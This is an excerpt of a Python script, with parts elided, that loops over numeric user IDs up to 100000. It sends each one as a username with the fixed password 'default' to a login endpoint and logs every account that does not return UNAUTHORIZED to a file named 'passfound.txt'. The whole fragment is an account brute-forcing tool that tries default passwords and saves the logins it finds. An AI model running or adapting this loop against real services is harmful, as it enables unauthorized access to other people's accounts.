...
while int(userid) < 100000:
    ...
    print(f"PROCESS==> {p}\n")
    print(f"{i}==> Trying: {useridx} \n")
    #useridx = useridx.strip()
    payload = json.dumps({"username":useridx,"password":"default"})
    ...
    try:
        ...
        if x2 != 'UNAUTHORIZED' and xs == 200:
            ...
            with open("passfound.txt", "a") as handle:
                lisnes = handle.write(f"{useridx} - {x} \n")
